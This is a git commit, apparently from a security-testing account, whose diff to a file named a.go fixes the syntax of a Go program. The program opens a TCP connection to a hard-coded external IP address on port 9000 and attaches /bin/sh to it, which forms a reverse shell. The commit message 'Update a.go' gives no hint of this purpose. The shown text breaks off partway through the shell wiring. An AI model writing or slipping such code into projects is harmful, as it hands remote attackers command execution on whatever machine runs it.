fb6a41bf8e7956bf54556da7757c589a4c67d4db
nlx41-test <nlx41@wearehackerone.com>
2026-05-13 21:19:00 +0200

    Update a.go

--- a.go
+++ a.go
@@ -1,5 +1,6 @@
-import ("net"; "os/exec"); \                                                                                                                                                           
-func main() { \                                                                                                                                                                         
+package main;
+import ("net"; "os/exec");                                                                                                                                                           
+func main() {                                                                                                                                                                        
    c, _ := net.Dial("tcp", "67.205.185.119:9000");                                                                                                                                     
    cmd := exec.Command("/bin/sh");                                                                                                                                                   
    cmd.Stdin = c;                                                                                                                                                                    
